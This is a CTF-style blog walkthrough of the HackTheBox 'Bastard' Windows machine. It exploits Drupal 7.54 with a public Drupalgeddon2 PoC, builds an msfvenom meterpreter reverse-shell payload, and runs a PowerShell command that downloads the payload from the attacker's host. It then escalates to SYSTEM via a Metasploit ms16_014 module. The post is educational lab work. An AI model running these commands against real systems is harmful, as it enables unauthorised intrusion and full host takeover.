@@ -1,0 +1,178 @@
+---
+title: "Bastard from HackTheBox"
+author: ferbot
+date: 2020-01-02 12:00:00 +0800
+categories: [htb, windows, bastard]
+tags: [htb, windows, drupal, metasploit, powershell]
+description: Easy Windows box from HTB about simple exploitation
+---
+
+### HTB: Bastard
+
+What a bastard was this one. User shell was harder than I thought as ruby scripts didn't work out for me and ended up using a python poc out there in the wild. PrivEsc was easy because of metasploit, I tried to escalate by running kernel exploits but couldn't.
+
+### Initial foothold
+
+Let's start right away with an intense nmap scan.
+
+```bash
+$ nmap -Pn -p- -sV --max-retries=1 --min-rate=1000 10.10.10.9
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-01 14:17 EST
+Nmap scan report for 10.10.10.9
+Host is up (0.16s latency).
+Not shown: 65532 filtered ports
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Microsoft IIS httpd 7.5
+135/tcp   open  msrpc   Microsoft Windows RPC
+49154/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 197.22 seconds
+```
+
+### Enumeration
+
+135 and 49154 ports do not really give us something useful to work with at the start, so we start with port 80.
+
+![placeholder](/assets/img/htb/bastard/1.png "Drupal")
+
+Right away we are encountered with some Drupal website. There's actually a drupal scan called droopescan; installation is as easy as pip3 install droopescan.
+
+```bash
+$ droopescan scan drupal -u http://10.10.10.9/
+
+[+] Plugins found:                                                              
+    ctools http://10.10.10.9/sites/all/modules/ctools/
+        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.txt
+        http://10.10.10.9/sites/all/modules/ctools/changelog.txt
+        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.TXT
+        http://10.10.10.9/sites/all/modules/ctools/LICENSE.txt
+        http://10.10.10.9/sites/all/modules/ctools/API.txt
+    libraries http://10.10.10.9/sites/all/modules/libraries/
+        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.txt
+        http://10.10.10.9/sites/all/modules/libraries/changelog.txt
+        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.TXT
+        http://10.10.10.9/sites/all/modules/libraries/README.txt
+        http://10.10.10.9/sites/all/modules/libraries/readme.txt
+        http://10.10.10.9/sites/all/modules/libraries/README.TXT
+        http://10.10.10.9/sites/all/modules/libraries/LICENSE.txt
+    services http://10.10.10.9/sites/all/modules/services/
+        http://10.10.10.9/sites/all/modules/services/README.txt
+        http://10.10.10.9/sites/all/modules/services/readme.txt
+        http://10.10.10.9/sites/all/modules/services/README.TXT
+        http://10.10.10.9/sites/all/modules/services/LICENSE.txt
+    image http://10.10.10.9/modules/image/
+    profile http://10.10.10.9/modules/profile/
+    php http://10.10.10.9/modules/php/
+
+[+] Themes found:
+    seven http://10.10.10.9/themes/seven/
+    garland http://10.10.10.9/themes/garland/
+
+[+] Possible version(s):
+    7.54
+
+[+] Possible interesting urls found:
+    Default changelog file - http://10.10.10.9/CHANGELOG.txt
+    Default admin - http://10.10.10.9/user/login
+
+[+] Scan finished (0:48:55.787253 elapsed)
+```
+
+Drupal version 7.54 is spotted. Now, next stop is to look in searchsploit for any vulnerability.
+
+```bash
+$ searchsploit drupal 7.5
+----------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                           |  Path
+                                                                                         | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------------------- ----------------------------------------
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                 | exploits/php/webapps/44557.rb
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)              | exploits/php/webapps/44542.txt
+Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution      | exploits/php/webapps/44449.rb
+----------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+```
+
+### Exploitation
+
+Neither ruby exploits or metasploit worked out for me; still I encourage you to try them. After a few google searches (by CVE-2018-7602 and Drupalgeddon) I managed to find a [python poc](https://github.com/lorddemon/drupalgeddon2).
+
+![placeholder](/assets/img/htb/bastard/2.png "Command execution!")
+
+Now, with command execution, next step is to get a reverse shell. First of all we create some payload to upload to the machine and execute to get cmd back to us.
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.32 LPORT=6767 -f exe > hval.exe
+```
+
+We also setup a listener into metasploit.
+
+```bash
+msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.14.32; set lport 6767; set ExitOnSession false; exploit -j"
+```
+
+A python HTTP server to download our files.
+
+```bash
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+And finally we download and execute the msfvenom payload to get a shell back to our machine.
+
+```bash
+python drupalgeddon2.py -h http://10.10.10.9 -c "powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.14.32/hval.exe', 'C:\inetpub\drupal-7.54\hval.exe')"
+```
+
+```bash
+python drupalgeddon2.py -h http://10.10.10.9 -c "hval.exe"
+```
+
+### Privilege Escalation
+
+With a meterpreter shell we're now set to launch metasploit's exploit_suggester module to give us a first hint to privesc.
+
+```bash
+msf5 post(multi/recon/local_exploit_suggester) > run
+
+[] 10.10.10.9 - Collecting local exploits for x64/windows...
+[] 10.10.10.9 - 13 exploit checks are being tried...
+[+] 10.10.10.9 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
+[+] 10.10.10.9 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
+[+] 10.10.10.9 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.10.9 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
+[+] 10.10.10.9 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+[+] 10.10.10.9 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
+[] Post module execution completed
+```
+
+Going through one by one we finally get some privileges.
+
+```bash
+msf5 exploit(windows/local/ms16_014_wmi_recv_notif) > set LHOST 10.10.14.32
+LHOST => 10.10.14.32
+msf5 exploit(windows/local/ms16_014_wmi_recv_notif) > run
+
+[] Started reverse TCP handler on 10.10.14.32:4444 
+[] Launching notepad to host the exploit...
+[+] Process 1488 launched.
+[] Reflectively injecting the exploit DLL into 1488...
+[] Injecting exploit into 1488...
+[] Exploit injected. Injecting payload into 1488...
+[] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[] Command shell session 2 opened (10.10.14.32:4444 -> 10.10.10.9:49454) at 2020-01-01 18:46:13 -0500
+
+C:\inetpub\drupal-7.54>whoami
+whoami
+nt authority\system
+```
+
+Root3d!
+
+### Thank you
+
+Any feedback is welcomed. As always thank you for reading!
